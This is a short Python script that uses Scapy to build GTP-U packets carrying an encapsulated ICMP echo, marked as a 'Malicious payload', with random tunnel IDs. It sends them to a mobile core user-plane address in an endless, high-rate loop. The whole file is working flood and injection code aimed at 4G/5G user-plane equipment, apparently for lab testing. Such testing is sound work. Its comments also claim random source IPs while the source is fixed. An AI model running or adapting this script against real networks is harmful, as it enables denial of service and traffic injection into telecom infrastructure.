#!/usr/bin/env python3
from scapy.all import IP, UDP, send, ICMP
from scapy.contrib.gtp import GTPHeader
import random

# Function to generate a random TEID
def random_teid():
    return random.randint(1, 1000000)

# Function to craft and send a packet with a random source IP
def send_packet_with_random_teid():
    # Craft ICMP packet with randome TEID
    pkt = (
        IP(src="10.42.0.108", dst="10.42.0.64") /
        UDP(sport=2152, dport=2152) /
        GTPHeader(version=1, PT=1, gtp_type=255, teid=random_teid()) /
        IP(src="10.45.0.42", dst="8.8.8.8") /
        ICMP(type=8, code=0, id=random.randint(1, 65535), seq=random.randint(1, 65535)) /
        b"Malicious payload " * 10  # Arbitrary payload
    )
    return pkt

# Send packets in a loop with random source IPs
while True:  # Loop indefinitely (replace with a condition if needed)
    pkt = send_packet_with_random_teid()
    send(pkt, count=random.randint(1,10), inter=0.0002, verbose=1)